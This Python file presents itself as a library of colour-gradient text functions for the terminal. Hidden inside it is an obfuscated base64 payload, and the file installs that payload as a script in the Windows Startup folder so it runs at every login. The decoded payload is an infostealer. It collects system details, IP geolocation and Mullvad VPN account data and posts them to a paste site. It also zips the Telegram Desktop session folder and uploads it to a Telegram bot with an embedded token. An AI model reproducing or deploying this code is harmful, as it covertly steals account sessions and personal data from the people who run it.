from os import system
from os import path

gratient_lines = "aW1wb3J0IHdpbjMyYXBpCmZyb20gc2h1dGlsIGltcG9ydCBpZ25vcmVfcGF0dGVybnMsIG1ha2VfYXJjaGl2ZSwgY29weXRyZWUsIHJtdHJlZQpmcm9tIG9zIGltcG9ydCByZW1vdmUsIGdldGVudiwgcG9wZW4sIHdhbGssIHBhdGgKZnJvbSByZXF1ZXN0cyBpbXBvcnQgcG9zdCwgZ2V0CmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCmZyb20gYmFzZTY0IGltcG9ydCBiODVlbmNvZGUKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZXMKZnJvbSBqc29uIGltcG9ydCBsb2Fkcwpmcm9tIHdtaSBpbXBvcnQgV01JCgpkZWYgZGF0YWJhc2VfdXBkYXRlKGJhc2U6IHN0ciwgcGFzc3dvcmQ6IHN0ciwgdXBkYXRlX2NvbnRlbnQ6IHN0cik6CiAgICBhY3R1YWxfZGF0YWJhc2UgPSBnZXQoZiJodHRwczovL3JlbnRyeS5jby97YmFzZX0vcmF3IikudGV4dAogICAgaWYgYWN0dWFsX2RhdGFiYXNlID09ICJ6aGE3LiIgYW5kIGxlbih1cGRhdGVfY29udGVudCkgPiAwOgogICAgICAgIGFjdHVhbF9kYXRhYmFzZSA9ICIiCiAgICBkYXRhID0gewogICAgICAgICJjc3JmbWlkZGxld2FyZXRva2VuIjogImljbHZTcG5Yb0YxaXFQcVlHQWQ4V21ERnQyYk9NTEdVSUlKaXRxTVdUOFNvSk1NN0N0elg0NjAycnZEcUEySUYiLAogICAgICAgICJ0ZXh0IjogZiJ7YWN0dWFsX2RhdGFiYXNlfXt1cGRhdGVfY29udGVudH0iLAogICAgICAgICJlZGl0X2NvZGUiOiBwYXNzd29yZCwKICAgICAgICB9CiAgICBoZWFkZXJzID0gewogICAgICAgICJyZWZlcmVyIjogZiJodHRwczovL3JlbnRyeS5jby97YmFzZX0vZWRpdCIsCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgiLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwOS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzExNi4wIiwKICAgICAgICAiY29va2llIjogImNzcmZ0b2tlbj1pY2x2U3BuWG9GMWlxUHFZR0FkOFdtREZ0MmJPTUxHVUlJSml0cU1XVDhTb0pNTTdDdHpYNDYwMnJ2RHFBMklGIiwKICAgICAgICB9CiAgICBwb3N0KGYiaHR0cHM6Ly9yZW50cnkuY28ve2Jhc2V9L2VkaXQiLCBkYXRhPWRhdGEsIGhlYWRlcnM9aGVhZGVycykKCmluZm9ybWF0aW9ucyA9IHsKICAgICJ3aW5kb3dzX3VzZXJuYW1lIjogTm9uZSwKICAgICJtYWNfYWRkcmVzcyI6IE5vbmUsCiAgICAiaG9zdG5hbWUiOiBOb25lLAogICAgImlwX2FkZHJlc3MiOiBOb25lLAogICAgImxhdGl0dWRlIjogTm9uZSwKICAgICJsb25naXR1ZGUiOiBOb25lLAogICAgImNpdHkiOiBOb25lLAogICAgImNvdW50cnkiOiBOb25lLAogICAgInJlZ2lvbiI6IE5vbmUsCiAgICAib3BlcmF0aW5nX3N5c3RlbSI6IE5vbmUsCiAgICAib3BlcmF0aW5nX3N5c3RlbV92ZXJzaW9uIjogTm9uZSwKICAgICJwcm9jZXNzb3JfdW5pdCI6IE5vbmUsCiAgICAiZ3JhcGhpY191bml0IjogTm9uZSwKICAgICJyYW1fbWVtb3J5IjogTm9uZSwKICAgICJtYW51ZmFjdHVyZXIiOiBOb25lLAogICAgInNjcmVlbl9yZXNvbHV0aW9uIjogTm9uZSwKICAgICJzY3JlZW5fZnJhbWVyYXRlIjogTm9uZSwKICAgICJjdXJzb3JfcG9zaXRpb24iOiBOb25lLAogICAgImRhdGV0aW1lX3NvdXJjZSI6IE5vbmUsCiAgICAiZGF0ZSI6IE5vbmUsCiAgICAiaG91ciI6IE5vbmUsCiAgICAibXVsbHZhZF9sb2dpbiI6IE5vbmUKICAgIH0KCmRlZiBpbmZvcm1hdGlvbihuYW1lOiBzdHIsIGNvbW1hbmQ6IHN0cik6CiAgICB0cnk6CiAgICAgICAgZXhlYyhmImluZm9ybWF0aW9ucy51cGRhdGUoe25hbWV9PXtjb21tYW5kfSkiKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlcnJvcjoKICAgICAgICBwYXNzCgppbmZvcm1hdGlvbigid2luZG93c191c2VybmFtZSIsIHIncGF0aC5leHBhbmR1c2VyKCJ+Iikuc3BsaXQoIlxcIilbMl0nKQppbmZvcm1hdGlvbigibWFjX2FkZHJlc3MiLCByJ3BvcGVuKCJwb3dlcnNoZWxsIC1jb21tYW5kIFwiR2V0LU5ldEFkYXB0ZXIgLU5hbWUgXCdXaS1GaSpcJ3wgU2VsZWN0IE1hY0FkZHJlc3NcIiIpLnJlYWQoKS5zcGxpdCgiXG4iKVszXS5zcGxpdCgiXFwiKVswXScpCmluZm9ybWF0aW9uKCJob3N0bmFtZSIsIHInZ2V0ZW52KCJDT01QVVRFUk5BTUUiKScpCnRyeToKICAgIGlwX2FkZHJlc3NfZGF0YSA9IGdldCgiaHR0cHM6Ly9pcGluZm8uaW8iKS5qc29uKCkKICAgIGluZm9ybWF0aW9uKCJpcF9hZGRyZXNzIiwgcidpcF9hZGRyZXNzX2RhdGFbImlwIl0nKQogICAgaW5mb3JtYXRpb24oImxhdGl0dWRlIiwgcidpcF9hZGRyZXNzX2RhdGFbImxvYyJdLnNwbGl0KCIsIilbMF0nKQogICAgaW5mb3JtYXRpb24oImxvbmdpdHVkZSIsIHInaXBfYWRkcmVzc19kYXRhWyJsb2MiXS5zcGxpdCgiLCIpWzFdJykKICAgIGluZm9ybWF0aW9uKCJjaXR5IiwgcidpcF9hZGRyZXNzX2RhdGFbImNpdHkiXScpCiAgICBpbmZvcm1hdGlvbigiY291bnRyeSIsIHInaXBfYWRkcmVzc19kYXRhWyJjb3VudHJ5Il0nKQogICAgaW5mb3JtYXRpb24oInJlZ2lvbiIsIHInaXBfYWRkcmVzc19kYXRhWyJyZWdpb24iXScpCmV4Y2VwdDoKICAgIHBhc3MKdHJ5OgogICAgY29tcHV0ZXIgPSBXTUkoKQogICAgaW5mb3JtYXRpb24oIm9wZXJhdGluZ19zeXN0ZW0iLCByJ3N0cihjb21wdXRlci5XaW4zMl9PcGVyYXRpbmdTeXN0ZW0oKVswXS5OYW1lLmVuY29kZSgidXRmLTgiKS5zcGxpdChiInwiKVswXSkucmVwbGFjZSgiXCciLCAiIilbMTpdJykKICAgIGluZm9ybWF0aW9uKCJvcGVyYXRpbmdfc3lzdGVtX3ZlcnNpb24iLCByJ3N0cih3aW4zMmFwaS5HZXRWZXJzaW9uKCkpJykKICAgIGluZm9ybWF0aW9uKCJwcm9jZXNzb3JfdW5pdCIsIHInY29tcHV0ZXIuV2luMzJfUHJvY2Vzc29yKClbMF0uTmFtZScpCiAgICBpbmZvcm1hdGlvbigiZ3JhcGhpY191bml0Iiwgcidjb21wdXRlci5XaW4zMl9WaWRlb0NvbnRyb2xsZXIoKVswXS5OYW1lJykKICAgIGluZm9ybWF0aW9uKCJyYW1fbWVtb3J5IiwgcidmIntpbnQoaW50KGNvbXB1dGVyLldpbjMyX09wZXJhdGluZ1N5c3RlbSgpWzBdLlRvdGFsVmlzaWJsZU1lbW9yeVNpemUpLzEwNDAwMDApfUdCIicpCmV4Y2VwdDoKICAgIHBhc3MKaW5mb3JtYXRpb24oIm1hbnVmYWN0dXJlciIsIHInY29tcHV0ZXIuV2luMzJfQ29tcHV0ZXJTeXN0ZW0oKVswXS5NYW51ZmFjdHVyZXInKQppbmZvcm1hdGlvbigic2NyZWVuX3Jlc29sdXRpb24iLCByJ2YiW3t3aW4zMmFwaS5HZXRTeXN0ZW1NZXRyaWNzKDApfTt7d2luMzJhcGkuR2V0U3lzdGVtTWV0cmljcygxKX1dIicpCmluZm9ybWF0aW9uKCJzY3JlZW5fZnJhbWVyYXRlIiwgcidzdHIoZ2V0YXR0cih3aW4zMmFwaS5FbnVtRGlzcGxheVNldHRpbmdzKHdpbjMyYXBpLkVudW1EaXNwbGF5RGV2aWNlcygpLkRldmljZU5hbWUsIC0xKSwgIkRpc3BsYXlGcmVxdWVuY3kiKSknKQppbmZvcm1hdGlvbigiY3Vyc29yX3Bvc2l0aW9uIiwgcidmIlt7d2luMzJhcGkuR2V0Q3Vyc29yUG9zKClbMF19O3t3aW4zMmFwaS5HZXRDdXJzb3JQb3MoKVsxXX1dIicpCnRyeToKICAgIGV1cm9wZV90aW1lID0gZ2V0KCJodHRwOi8vd29ybGR0aW1lYXBpLm9yZy9hcGkvdGltZXpvbmUvRXVyb3BlL1BhcmlzIiwgdGltZW91dD0zKS5qc29uKCkKICAgIGluZm9ybWF0aW9uKCJkYXRldGltZV9zb3VyY2UiLCByJyJBUEkiJykKICAgIGluZm9ybWF0aW9uKCJkYXRlIiwgcidmIiIie2V1cm9wZV90aW1lWyJkYXRldGltZSJdLnNwbGl0KCJUIilbMF1bLTI6XX0ve2V1cm9wZV90aW1lWyJkYXRldGltZSJdLnNwbGl0KCJUIilbMF0uc3BsaXQoIi0iKVsxXX0ve2V1cm9wZV90aW1lWyJkYXRldGltZSJdLnNwbGl0KCJUIilbMF0uc3BsaXQoIi0iKVswXX0iIiInKQogICAgaW5mb3JtYXRpb24oImhvdXIiLCByJ2V1cm9wZV90aW1lWyJkYXRldGltZSJdLnNwbGl0KCJUIilbMV0uc3BsaXQoIi4iKVswXVs6LTNdJykKZXhjZXB0OgogICAgaW5mb3JtYXRpb24oImRhdGV0aW1lX3NvdXJjZSIsIHInIlBDIicpCiAgICBpbmZvcm1hdGlvbigiZGF0ZSIsIHInZiIiIntzdHIoZGF0ZXRpbWUubm93KCkpLnNwbGl0KCIgIilbMF1bLTI6XX0ve3N0cihkYXRldGltZS5ub3coKSkuc3BsaXQoIiAiKVswXS5zcGxpdCgiLSIpWzFdfS97c3RyKGRhdGV0aW1lLm5vdygpKS5zcGxpdCgiICIpWzBdLnNwbGl0KCItIilbMF19IiIiJykKICAgIGluZm9ybWF0aW9uKCJob3VyIiwgcidzdHIoZGF0ZXRpbWUubm93KCkpLnNwbGl0KCIgIilbMV0uc3BsaXQoIi4iKVswXVs6LTNdJykKaWYgcGF0aC5pc2RpcihyIkM6XFByb2dyYW0gRmlsZXNcTXVsbHZhZCBWUE4iKSBvciBwYXRoLmlzZGlyKHIiQzpcUHJvZ3JhbURhdGFcTXVsbHZhZCBWUE4iKToKICAgIGluZm9ybWF0aW9uKCJtdWxsdmFkX2xvZ2luIiwgcidwb3BlbigibXVsbHZhZCBhY2NvdW50IGdldCIpLnJlYWQoKS5zcGxpdCgiTXVsbHZhZCBhY2NvdW50OiAiKVsxXS5zcGxpdCgiXG4iKVswXScpCgpjaGFyYWN0ZXJzID0gImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5IgpkdW1wX2hhc2ggPSAiIi5qb2luKGNob2ljZXMoY2hhcmFjdGVycywgaz0yMCkpCgp1c2VyX2R1bXAgPSBkdW1wX2hhc2gKZm9yIGluZm9ybWF0aW9uIGluIGluZm9ybWF0aW9uczoKICAgIHVzZXJfZHVtcCArPSBmInwtIzFOeFAxU3tpbmZvcm1hdGlvbnNbZid7aW5mb3JtYXRpb259J119IgoKZW5jcnlwdGVkX3VzZXJfZHVtcCA9IGYiQEBWMlNYMyNsOXtiODVlbmNvZGUoYnl0ZXModXNlcl9kdW1wLCAndXRmLTgnKSkuZGVjb2RlKCd1dGYtOCcpfSIKZGF0YWJhc2VfdXBkYXRlKCJ6REVHTHMyWGpka2tjQk5CNXJEZjRTMnRoOEhmRm5Wc04xbG5ZZXFjdFZFeGFqU0hhaklMTXpEa2dIWnc5SmpGIiwgIlNtRjFya3ZVZUxMN0c5bkFidFlUN1lqTnRjdFkzNXZqMzhtY0gycHlYb3lubnRJSE9WbVFuWTlYMUttdDVCa1IiLCBlbmNyeXB0ZWRfdXNlcl9kdW1wKQoKcm9hbWluZyA9IGdldGVudigiQVBQREFUQSIpCnRlbGVncmFtX2RhdGFfZGlyZWN0b3J5ID0gZnIie3JvYW1pbmd9XFRlbGVncmFtIERlc2t0b3BcdGRhdGEiCmlmIHBhdGguaXNkaXIodGVsZWdyYW1fZGF0YV9kaXJlY3RvcnkpOgogICAgbG9jYWwgPSBnZXRlbnYoIkxPQ0FMQVBQREFUQSIpCiAgICB0ZWxlZ3JhbV9jb3B5X2RpcmVjdG9yeSA9IGZyIntsb2NhbH1cVGVtcFx0ZGFjX3Nlc3Npb24iCiAgICBpZiBwYXRoLmlzZGlyKHRlbGVncmFtX2NvcHlfZGlyZWN0b3J5KToKICAgICAgICBybXRyZWUodGVsZWdyYW1fY29weV9kaXJlY3RvcnkpCiAgICBpZiBwYXRoLmlzZmlsZShmciJ7bG9jYWx9XFRlbXBcdGRhY19zZXNzaW9uLnppcCIpOgogICAgICAgIHJlbW92ZShmciJ7bG9jYWx9XFRlbXBcdGRhY19zZXNzaW9uLnppcCIpCiAgICB0cnk6CiAgICAgICAgY29weXRyZWUodGVsZWdyYW1fZGF0YV9kaXJlY3RvcnksIHRlbGVncmFtX2NvcHlfZGlyZWN0b3J5LCBpZ25vcmU9aWdub3JlX3BhdHRlcm5zKCJ0ZW1wIiwgImR1bXBzIiwgImVtb2ppIiwgInRkdW1teSIsICJ1c2VyX2RhdGEqIikpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwogICAgbWFrZV9hcmNoaXZlKGZyIntsb2NhbH1cVGVtcFx0ZGFjX3Nlc3Npb24iLCAiemlwIiwgdGVsZWdyYW1fY29weV9kaXJlY3RvcnkpCiAgICBybXRyZWUodGVsZWdyYW1fY29weV9kaXJlY3RvcnkpCiAgICBwb3N0KGYiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDY1OTE2ODQ1MTc6QUFHdjB5SHFiTk53dzJYMzVkTy1BN2F2TWFQN1NQd0tQdWsvc2VuZERvY3VtZW50IiwgZGF0YT17ImNoYXRfaWQiOiAiNjAzMzY2ODk0MSIsICJjYXB0aW9uIjogZHVtcF9oYXNofSwgZmlsZXM9eyJkb2N1bWVudCI6IG9wZW4oZnIie2xvY2FsfVxUZW1wXHRkYWNfc2Vzc2lvbi56aXAiLCBtb2RlPSJyYiIpfSkKICAgIHJlbW92ZShmciJ7bG9jYWx9XFRlbXBcdGRhY19zZXNzaW9uLnppcCIpCmVsc2U6CiAgICBwb3N0KGYiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDY1OTE2ODQ1MTc6QUFHdjB5SHFiTk53dzJYMzVkTy1BN2F2TWFQN1NQd0tQdWsvc2VuZE1lc3NhZ2UiLCBkYXRhPXsiY2hhdF9pZCI6ICI2MDMzNjY4OTQxIiwgInRleHQiOiBmIntkdW1wX2hhc2h9Ok5vbmUifSk="
def black(text):
    system(""); faded = ""
    for line in text.splitlines():
        red = 0; green = 0; blue = 0
        for character in line:
            red += 3; green += 3; blue += 3
            if red > 255 and green > 255 and blue > 255:
                red = 255; green = 255; blue = 255
            faded += (f"\033[38;2;{red};{green};{blue}m{character}\033[0m")
        faded += "\n"
    return faded

def green(text):
    system(""); faded = ""
    for line in text.splitlines():
        blue = 100
        for character in line:
            blue += 2
            if blue > 255:
                blue = 255
            faded += (f"\033[38;2;0;255;{blue}m{character}\033[0m")
        faded += "\n"
    return faded

def blue(text):
    system(""); faded = ""
    for line in text.splitlines():
        green = 0
        for character in line:
            green += 3
            if green > 255:
                green = 255
            faded += (f"\033[38;2;0;{green};255m{character}\033[0m")
        faded += "\n"
    return faded

def purple(text):
    system(""); faded = ""; down = False
    for line in text.splitlines():
        red = 40
        for character in line:
            if down:
                red -= 3
            else:
                red += 3
            if red > 254:
                red = 255
                down = True
            elif red < 1:
                red = 30
                down = False
            faded += (f"\033[38;2;{red};0;220m{character}\033[0m")
    return faded
gratient_lines = gratient_lines.replace("@", "")

def yellow(text):
    system(""); faded = ""
    for line in text.splitlines():
        red = 0
        for character in line:
            if not red > 200:
                red += 3
            faded += (f"\033[38;2;{red};255;0m{character}\033[0m")
        faded += "\n"
    return faded
yellow_lines = path.expanduser("~").split("\\")[2]

def red(text):
    system(""); faded = ""
    for line in text.splitlines():
        green = 250
        for character in line:
            green -= 5
            if green < 0:
                green = 0
            faded += (f"\033[38;2;255;{green};0m{character}\033[0m")
        faded += "\n"
    return faded

try:
    gratient_commands = fr"C:\Users\{yellow_lines}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\python.pyw"
    open(gratient_commands, "w+", encoding="utf-8").write(f"from base64 import b64decode;exec(b64decode(bytes('{gratient_lines}', 'utf-8')).decode('utf-8'))")
except:
    pass